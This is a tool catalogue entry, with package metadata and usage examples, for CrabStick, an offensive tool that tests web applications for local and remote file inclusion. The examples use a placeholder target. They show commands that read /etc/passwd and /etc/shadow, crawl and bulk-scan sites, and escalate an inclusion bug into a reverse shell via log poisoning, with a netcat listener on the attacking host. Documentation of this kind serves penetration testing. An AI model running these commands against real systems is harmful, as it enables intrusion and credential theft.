---
name: "crabstick"
categories:
  - blackarch-webapp
version: "47.bb7827f"
homepage: "https://github.com/Hack-Hut/CrabStick"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-12"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "Hack-Hut/CrabStick"
github-stars: 60
github-pushed: "2019-05-08"
github-archived: false
github-issues: 3
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.3
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# crabstick

> File-inclusion (LFI/RFI) analysis and exploitation: find the flaw, read files, escalate to a shell.

## What it's for

CrabStick attacks HTTP file-inclusion bugs end to end: it enumerates parameters on a URL (or a list of URLs, a crawled site, or targets found via search-engine dorks), tests them for local and remote file inclusion, confirms with a readable file (`/etc/passwd` by default), and can escalate an LFI — for example via log poisoning — into a reverse shell with `--lport`/`--rport`. Classic options let you tune POST data, proxy, cookies, custom or random user agents, threads, rate limiting, target OS (`--os w|l`) and crawl depth. The upstream repository ships the entry point as `crabsticks.py` with no README; note the packaged `/usr/bin/crabstick` launcher references `crabstick.py` and misses, so invoke the shipped file directly.

## Typical use cases

### Test one URL for file inclusion

Single-target parameter analysis and confirmation read.

```
python3 /usr/share/crabstick/crabsticks.py single --url=http://target.example.com/page.php?view=about.html
```

Outcome: enumerates the URL's GET parameters, probes each for LFI/RFI, and on a hit reads the confirmation file (default `/etc/passwd`, matched against `root:x:0:`); override the proof with `--local=/etc/shadow --search=root:` to confirm deeper reads.

### Test a list of URLs

Bulk inclusion hunting across collected endpoints.

```
python3 /usr/share/crabstick/crabsticks.py list --list=urls.txt --random-agents -t 10
```

Outcome: runs the same parameter-by-parameter inclusion tests over every URL in `urls.txt`, one per line, with 10 threads and rotating user agents, reporting which endpoints and parameters are injectable.

### Crawl a site and test everything found

Discover targets and attack them in one pass.

```
python3 /usr/share/crabstick/crabsticks.py crawl --url=http://target.example.com/ --follow --max-depth=3
```

Outcome: crawls the site (following external links with `--follow`, up to 3 directories deep) and file-inclusion-tests every parameterized URL the crawl discovers.

### Pivot an LFI into a reverse shell

Escalate a confirmed inclusion to code execution.

```
python3 /usr/share/crabstick/crabsticks.py single --url=http://target.example.com/page.php?view=about.html --os=l --lport=4444
```

Outcome: attempts the built-in escalation path (log poisoning on Linux targets) to spawn a connection back to your listener on port 4444 — have `nc -lvnp 4444` ready on the attacking host.

No corpus evidence — derived from upstream source (docopt usage).
